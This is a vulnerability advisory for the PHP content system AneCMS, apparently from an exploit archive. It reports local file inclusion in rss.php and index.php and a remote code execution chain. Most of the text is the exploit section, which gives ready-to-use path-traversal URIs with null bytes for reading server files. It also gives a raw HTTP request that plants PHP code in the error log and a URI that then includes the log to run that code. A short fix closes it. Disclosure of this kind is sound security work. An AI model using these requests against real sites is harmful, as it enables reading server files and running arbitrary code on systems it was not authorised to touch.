- Description:
####################

AneCMS is a small and fast CMS completely modular. Written in PHP with  
JS(jQuery), Multilanguage, Skinnable
and has an online repository of modules accessible from the ACP of the  
CMS. Using MySQL as the backend DBMS.


####################
- Vulnerability:
####################

+--> Local File Inclusion (LFI)
	The AneCMS try to locate local files for responding users according  
to GET parameters. There are 25 infected
	files, but approximately whole of them are protected else of the  
&#039;index.php&#039; and &#039;rss.php&#039; files. Check the
	exploits section for the details.

+--> Remote Code Execution
	With a RAW HTTP packet sender, you can send unescaped php code to  
AneCMS. Then this code can be executed using
	the LFI vulnerability. Check the exploits section for the details.

####################
- Exploits/PoCs:
####################

+--> Exploiting The Local File Inclusion (LFI)
	For the &#039;rss.php&#039;, you can select local file relative path from the  
&#039;modules&#039; directory using &#039;module&#039; GET
	parameter. For example following URI can be used for inspecting the  
&#039;.htaccess&#039; file:
	http://target.com/rss.php?module=../.htaccess%00
	For the &#039;index.php&#039;, you can select local file relative path from the  
&#039;system/ajax&#039; directory using &#039;ajax&#039; GET
	parameter. For example following URI can be used for inspecting the  
&#039;.htaccess&#039; file:
	http://target.com/index.php?ajax=../../.htaccess%00

+--> Remote Code Execution
	This attack should be done in two phases. First use the LFI to inject  
the desired php code in the web server
	log file. Then use the LFI again to execute it.
	For example if you want to run &#039;<?php echo "ShahShah..."; ?>&#039; code,  
first send the following HTTP packet:
		GET /rss.php?module=../<?php echo "ShahShah..."; ?>%00 HTTP/1.0
		Host: target.com
		User-Agent: UA

	This packet will inject the &#039;<?php echo "ShahShah..."; ?>&#039; in the  
error logs. Then visit following URI:
	http://target.com/rss.php?module=../the/path/to/logs/folder/logs/php_error.log%00

	Above URI will include the error log (including your injected code)  
and execute it.

- Solution:
####################

Instead of generating the inclusion path by GET parameters directly,  
check the value of the parameter and
then include the valid hard-coded file path.
